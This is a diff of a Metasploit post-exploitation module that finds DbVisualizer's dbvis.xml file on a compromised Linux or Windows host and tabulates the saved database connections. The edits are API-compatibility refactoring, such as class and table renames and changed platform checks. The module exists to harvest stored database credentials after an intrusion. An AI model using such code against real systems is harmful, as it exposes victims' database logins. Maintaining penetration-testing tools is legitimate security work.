@@ -8,7 +8,7 @@ require 'msf/core/auxiliary/report'
 require 'openssl'
 require 'digest/md5'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
 
   include Msf::Post::File
   include Msf::Post::Unix
@@ -38,7 +38,7 @@ class Metasploit3 < Msf::Post
     oldversion = false
 
     case session.platform
-    when /linux/
+    when 'linux'
       user = session.shell_command('whoami').chomp
       print_status("Current user is #{user}")
       if user =~ /root/
@@ -47,8 +47,8 @@ class Metasploit3 < Msf::Post
          user_base = "/home/#{user}/"
       end
       dbvis_file = "#{user_base}.dbvis/config70/dbvis.xml"
-    when /win/
-      if session.type =~ /meterpreter/
+    when 'windows'
+      if session.type == 'meterpreter'
         user_profile = session.sys.config.getenv('USERPROFILE')
       else
         user_profile = cmd_exec("echo %USERPROFILE%").strip
@@ -61,9 +61,9 @@ class Metasploit3 < Msf::Post
       print_status("File not found: #{dbvis_file}")
       print_status('This could be an older version of dbvis, trying old path')
       case session.platform
-      when /linux/
+      when 'linux'
         dbvis_file = "#{user_base}.dbvis/config/dbvis.xml"
-      when /win/
+      when 'windows'
         dbvis_file = user_profile + "\\.dbvis\\config\\dbvis.xml"
       end
       unless file?(dbvis_file)
@@ -112,7 +112,7 @@ class Metasploit3 < Msf::Post
   # New config file parse function
   def parse_new_config_file(raw_xml)
 
-    db_table = Rex::Ui::Text::Table.new(
+    db_table = Rex::Text::Table.new(
     'Header'    => "DbVisualizer Databases",
     'Indent'    => 2,
     'Columns'   =>
@@ -219,7 +219,7 @@ class Metasploit3 < Msf::Post
   # New config file parse function
   def parse_old_config_file(raw_xml)
 
-    db_table = Rex::Ui::Text::Table.new(
+    db_table = Rex::Text::Table.new(
     'Header'    => 'DbVisualizer Databases',
     'Indent'    => 2,
     'Columns'   =>
